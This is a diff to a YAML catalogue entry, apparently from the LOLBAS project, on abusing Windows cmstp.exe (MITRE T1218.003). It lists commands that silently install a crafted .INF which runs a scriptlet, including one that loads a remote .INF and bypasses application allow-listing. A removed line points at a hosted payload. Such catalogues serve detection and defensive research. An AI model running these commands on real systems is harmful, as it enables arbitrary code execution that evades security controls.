@@ -1,10 +1,10 @@
 ---
 Name: Cmstp.exe
 Description: Installs or removes a Connection Manager service profile.
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
+  - Command: cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
     Description: Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
     Usecase: Execute code hidden within an inf file. Download and run scriptlets from internet.
     Category: Execute
@@ -12,8 +12,8 @@ Commands:
     MitreID: T1218.003
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
-      - Input: INF
-  - Command: cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
+      - Execute: INF
+  - Command: cmstp.exe /ni /s {REMOTEURL:.inf}
     Description: Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
     Usecase: Execute code hidden within an inf file. Execute code directly from Internet.
     Category: AWL Bypass
@@ -21,7 +21,8 @@ Commands:
     MitreID: T1218.003
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
     Tags:
-      - Input: INF
+      - Execute: INF
+      - Execute: Remote
 Full_Path:
   - Path: C:\Windows\System32\cmstp.exe
   - Path: C:\Windows\SysWOW64\cmstp.exe
